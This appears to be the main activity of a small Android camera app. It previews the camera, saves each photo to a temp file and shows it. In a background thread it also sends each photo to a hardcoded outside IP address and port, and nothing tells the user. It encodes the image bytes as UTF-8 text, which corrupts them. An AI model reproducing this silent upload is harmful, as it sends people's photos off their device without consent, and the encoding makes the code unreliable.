package com.example.night_fury.eagle;

import android.content.Intent;
import android.hardware.Camera;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.view.SurfaceHolder;
import android.view.SurfaceView;
import android.view.View;
import android.widget.Button;
import android.widget.Toast;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.net.InetAddress;
import java.net.Socket;
import java.nio.ByteBuffer;
import java.nio.CharBuffer;
import java.nio.charset.Charset;

public class MainActivity extends AppCompatActivity {

    private SurfaceView sfv_preview;
    private Button btn_take;
    private Camera camera = null;

    private SurfaceHolder.Callback cpHolderCallBack = new SurfaceHolder.Callback(){
        @Override
        public void surfaceCreated(SurfaceHolder holder){
            startPreview();
        }

        @Override
        public void surfaceChanged(SurfaceHolder holder, int format, int width, int height){

        }

        @Override
        public void surfaceDestroyed(SurfaceHolder holder){
            stopPreview();
        }
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        bindViews();
    }

    private void bindViews(){
        sfv_preview = findViewById(R.id.sfv_preview);
        btn_take = findViewById(R.id.btn_take);
        sfv_preview.getHolder().addCallback(cpHolderCallBack);

        btn_take.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                camera.takePicture(null, null, new Camera.PictureCallback(){
                    @Override
                    public void onPictureTaken(byte[] data, Camera camera){
                        String path = "";
                        path = saveFile(data);
                        try {
                            acceptServer(data);
                        }catch(IOException e){
                            e.printStackTrace();
                        }
                        if(path != null){
                            Intent it = new Intent(MainActivity.this, PreviewActivity.class);
                            it.putExtra("path", path);
                            startActivity(it);
                        }else{
                            Toast.makeText(MainActivity.this, "Failed to save picture", Toast.LENGTH_SHORT).show();
                        }
                    }
                });
            }
        });
    }

    private String saveFile(byte[] bytes){
        try{
            File file = File.createTempFile("img", "");
            FileOutputStream fos = new FileOutputStream(file);
            fos.write(bytes);
            fos.flush();
            fos.close();
            return file.getAbsolutePath();
        }catch (IOException e){
            e.printStackTrace();
            return null;
        }
    }

    private void startPreview(){
        camera = Camera.open();
        try{
            camera.setPreviewDisplay(sfv_preview.getHolder());
            camera.setDisplayOrientation(90);
            camera.startPreview();
        }catch (IOException e){
            e.printStackTrace();
        }
    }

    private void stopPreview(){
        camera.stopPreview();
        camera.release();
        camera = null;
    }

    private void acceptServer(final byte[] data) throws IOException{
        new Thread(){
            @Override
            public void run(){
                try{
                    Socket socket = new Socket("202.38.214.230", 12345);
                    OutputStream os = socket.getOutputStream();
                    PrintWriter pw = new PrintWriter(os);
                    InetAddress address = InetAddress.getLocalHost();
                    String ip = address.getHostAddress();

                    pw.write(getChars(data));
                    pw.flush();
                    socket.shutdownOutput();
                    socket.close();
                }catch (IOException e){
                    e.printStackTrace();
                }
            }
        }.start();
    }

    public static char[] getChars(byte[] bytes){
        Charset cs = Charset.forName("UTF-8");
        ByteBuffer bb = ByteBuffer.allocate(bytes.length);
        bb.put(bytes);
        bb.flip();
        CharBuffer cb = cs.decode(bb);
        return cb.array();
    }

}













